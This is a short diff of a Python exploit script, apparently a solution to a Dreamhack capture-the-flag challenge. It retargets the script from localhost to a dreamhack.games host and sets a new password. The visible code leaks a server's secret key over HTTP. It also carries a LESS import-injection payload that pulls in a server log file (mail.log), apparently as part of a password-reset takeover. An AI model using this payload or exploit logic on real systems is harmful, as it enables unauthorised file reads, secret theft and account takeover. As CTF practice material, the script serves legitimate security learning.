@@ -38,7 +38,7 @@ class Exploit:
         response = requests.get(url=url, timeout=self.timeout)
         if response.status_code == 200:
             print(f"[+] Leak Secret Key Success: ", response.text, "\n")
-            return response.text   # trả về text luôn
+            return response.text 
         else:
             print(f"[-] Leak Secret Key Failed: ", response.text, "\n")
             return None
@@ -99,8 +99,8 @@ class Exploit:
 
 
 if __name__ == "__main__":
-    BASE_URL = "http://127.0.0.1:3000"
-    newPassword = "123"
+    BASE_URL = "http://host8.dreamhack.games:23637"
+    newPassword = "foobar"
     payload = '#5C62D6;@import (inline) "mail.log";'
     timeout = 5.0
     exploit = Exploit(BASE_URL, newPassword, payload, timeout)
